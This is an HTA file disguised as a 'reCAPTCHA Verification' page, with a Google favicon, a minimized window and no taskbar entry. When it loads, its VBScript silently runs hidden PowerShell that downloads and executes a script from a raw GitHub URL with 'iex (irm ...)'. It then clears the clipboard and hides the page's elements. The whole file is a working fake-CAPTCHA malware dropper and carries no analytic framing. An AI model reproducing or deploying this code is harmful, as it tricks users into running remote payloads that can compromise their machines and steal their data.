<!DOCTYPE html>
<html>
<head>
    <title>reCAPTCHA Verification</title>
    <HTA:APPLICATION
        APPLICATIONNAME="reCAPTCHA Verification"
        BORDER="none"
        BORDERSTYLE="none"
        ICON="https://support.google.com/favicon.ico"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        WINDOWSTATE="minimized"
        SCROLL="no"
        SCROLLFLAT="yes"
        SYSMENU="no"
    />
    <style>
        body {
            display: none; /* Hide body content completely */
        }
    </style>
    <script language="VBScript">
    Sub Window_onLoad
        ' Run the PowerShell script in the background, invisible to the user
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell -w h -nop -c ""iex (irm 'https://raw.githubusercontent.com/BalletsPistol/_/main/n')""", 0, False
        
        ' Clear clipboard and hide other UI elements
        ClearClipboard
        Call HideConnectingShowError
    End Sub

    Sub HideConnectingShowError
        ' Hide any connecting or error messages (if present)
        document.getElementById("connecting").style.display = "none"
        document.getElementById("error").style.display = "none"
    End Sub

    Sub ClearClipboard
        Dim objHTML
        Set objHTML = CreateObject("htmlfile")
        objHTML.parentWindow.clipboardData.setData "text", ""
        Set objHTML = Nothing
    End Sub
    </script>
</head>
<body>
    <!-- Optional content can be added here, but will be hidden -->
</body>
</html>
